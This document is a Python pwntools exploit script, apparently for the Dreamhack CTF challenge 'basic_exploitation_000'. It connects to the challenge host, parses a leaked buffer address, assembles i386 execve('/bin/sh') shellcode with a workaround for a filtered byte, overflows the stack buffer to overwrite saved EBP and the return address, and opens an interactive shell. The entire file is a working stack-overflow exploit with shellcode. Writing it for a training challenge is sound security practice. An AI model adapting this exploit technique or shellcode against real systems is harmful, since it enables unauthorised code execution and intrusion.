#!/usr/bin/env python3
from pwn import *

context.arch = "i386"
context.os = "linux"

r = remote("host1.dreamhack.games", 12849)
#r = process("./basic_exploitation_000", stdin=PTY)

r.recvuntil(b'buf = ')
data = r.recvlineS(keepends=False)
data = data[1:-1] # data = f"({addr})"
addr = int(data, 16)

print(f"Found addr: {hex(addr)}")

# /flag = 27 66 6c 61 67
asm_shell = """
call code
.asciz "/bin/sh"
code:
pop ebx
xor ecx, ecx
xor edx, edx
mov eax, 8
add eax, 3
int 0x80
"""

shellcode = asm(asm_shell)

payload = shellcode.ljust(0x80, b'A')
payload += b'B' * 4 #overwrite ebp
payload += p32(addr) # overwrite ret addr
payload = payload.ljust(140, b'C')

print(disasm(shellcode))
print(f"len = {len(payload)}")

r.sendline(payload)
#print(r.recvall())
r.interactive()
